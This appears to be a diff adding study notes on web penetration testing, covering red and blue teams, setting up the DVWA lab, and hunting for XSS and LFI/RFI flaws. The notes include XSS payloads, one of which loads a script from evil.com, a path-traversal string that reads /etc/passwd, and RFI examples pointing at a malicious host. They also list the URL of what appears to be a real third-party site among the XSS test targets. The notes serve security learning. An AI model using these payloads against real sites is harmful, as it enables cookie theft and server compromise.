@@ -1,0 +1,239 @@
+Red Teams [ The Attackers ]
+``````````
++ team with knowledge of how to break in
++ but no knowledge of what security is already in place
++ Very large organizations do have internal Red Teams
++ They adept all forms of digital attack, like: social engineering, break into the systems etc...
++ Red Team is going to try everything they can to hack into sensitive systems.
+
+Blue teams [ The Defenders ]
+```````````
++ usually members of the IT Security or Data Security divisions 
++ They continually attempt to harden security
+
+Red Teams and Blue Teams (Purple teams) 
+`````````````````````````
++ They makw sure data systems and networks get safe and stay safe
++ They constant test using the latest vulnerabilities
+__________________________________________________________________________________________________
+DVWA 
+-----
+# cd /var/www/html
+
+# git clone https://github.com/digininja/DVWA.git
+# cd DVWA
+# vim config/config.inc.php.dist
+
+$_DVWA[ 'db_server' ]   = '127.0.0.1';
+$_DVWA[ 'db_database' ] = 'dvwa';
+$_DVWA[ 'db_user' ]     = 'dvwa';
+$_DVWA[ 'db_password' ] = 'redhat';
+$_DVWA[ 'db_port'] = '3306';
+
+:wq
+
+
+# service mariadb start
+Starting MariaDB database server: mariadbd.
+
+# mysql -u root
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+4 rows in set (0.000 sec)
+
+MariaDB [(none)]> create database dvwa;
+Query OK, 1 row affected (0.001 sec)
+
+MariaDB [(none)]> create user dvwa@localhost identified by 'redhat';
+Query OK, 0 rows affected (0.005 sec)
+
+MariaDB [(none)]> grant all on dvwa.* to dvwa@localhost;
+Query OK, 0 rows affected (0.002 sec)
+
+MariaDB [(none)]> flush privileges;
+Query OK, 0 rows affected (0.003 sec)
+
+
+# mv config/config.inc.php.dist config/config.inc.php
+
+_______________________________
+XSS [ Cross Site Scripting ]
+----------------------------Injection
+Impact:
+-------
+> Cookie Theft 	:	document.cookie
+> Keylogging	
+> Phishing
+> URL Redirection ...
+
+Types:
+------
+> rXSS		[ Reflected XSS ]
+> sXSS		[ Stored XSS ]
+> DOM-XSS 	[ JavaScript ]
+
+How to hunt for XSS:
+--------------------
+1. Find an input parameter, Give any input there, If your input reflect or stored anywhere in response, then XSS possible.
+
+2. Try to execute any Javascript code there, if you sceed to execute any javascript then XSS is possible.
+
+++++https://twitter.com/Dheerajmadhukar/status/1382023372977053697/photo/1+++++++++
+
+1) Basic XSS:
+-------------
+a) Find some common pages such as - Contact US, Search bar, Comment Box, Forums, SignUp, Login etc....
+
+b) Find Input Parameters.
+
+c) Give any input, ig your input reflect back
+
+d) Try execute Javascript.
+_____________________________________________________
+Input Area:
+```````````
+<input name="searchFor" type="text" size="10">
+
+Where it reflects:
+```````````````````
+<h2 id="pageName">searched for: oiuyf</h2>
+
+Param & Method:
+---------------
+Method	:		POST
+Param	: 		searchFor
+Value	:		"riya"
+_____________________________________________________________
+XSS:
+-----
+
+Jail Env for your input:
+
+HTML Injection
+
+looking=dheeraj"><script src="http://evil.com/evil.js"></script>
+
+
+<input type="text" id="looking" name="looking" value="dheeraj"><h1>Hacked</h1>">
+
+
+
+<span> lol </span>
+
+
+https://gochanakya.com/find-my-chanakya/?looking=lol&services=&age_from_year=&age_to_year=&selected_location=jaipur&selected_license=&from_ratings=&to_ratings=
+
+
+
+<input type="text" name="first_name" id="first_name" required="required" class="form-control mb-2" placeholder="First Name" data-placement="right">
+
+<script>alert("in")</script>
+
+<h5>in1 in2</h5>
+<span>Hi in1</span>
+_____________________________________________________________________________
+LFI/RFI:
+---------
+
+Imapct of File inclusion: 
+-------------------------
+1. code execution on server 
+2. code execution client side 
+3. dos attack 
+4. information disclosure 
+
+Two types of File Inclusion:
+-=-=-=-=-=-=-=--=-=-=-=-=-=
+1. Local file inclusion 
+2. Remote File Inclusion 
++++++++++++++++++++++++++++
+1. Local file inclusion:
+~~~~~~~~~~~~~~~~~~~~~~~~
+anyparameter=somelocalfile 
+
+example:
+target.com/index.php?referer=login.php
+
+
+2. Remote File Inclusion: 
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+anyparmeter=remoteweb.com/file 
+
+example: 
+target.com/?share=http://facebook.com/status?id=12672
+
+Some Common Parameters:
+-----------------------
+LFI:
+[file,document,folder,root,route,path,pg,style,pdf,template,php_path,doc, many more...]
+
+RFI:
+[dest,redirect,uri,path,continue,url,window,next,data,reference,site,html,val,validate,domain,callback,return,page,feed,host,port,to,out,view,dir,show,navigation,open, many more...]
+
+--------------------------------------------
+
+LFI Vs RFI :
+------------
+LFI:
+----
+if target web server is reside on Linux Apache Platform 
+
+server path will be /var/www/html/trump.jpeg 
+
+target.com/index.php?file=trump.jpeg
+
+system configuration file by going root directory [/]
+
+Example: /etc/passwd
+any.com/index.php?file=../../../etc/passwd
+
+
+RFI:
+----
+any.com/index.php?file=http://remoteweb.com/trump.jpg 
+
+any.com/index.php?file=http://malacious.com/malacious.html
+
+<html><script>alert(1)</script>
+</html>
+-----------------------------------------
+
+LFI Hunting: 
+------------
+1. You have to find a parameter that includes some local file.
+
+target - 
+testphp.vulnweb.com
+
+YOU CAN SPIDER/CRAWL THE TARGET AND SEARCH FOR THE POSSIBLE PARAMETERS. eg: ?file=
+
+LFI through Intruder:
+---------------------
+1. You have to find a parameter that includes some local file.
+2. Try LFI Payloads
+----------------------------------------
+RFI Hunting: 
+------------
+1. You have to find any parameter that will able to load content of any remote website. 
+
+
+
+
+
+
+
+
+
+
+
+
+
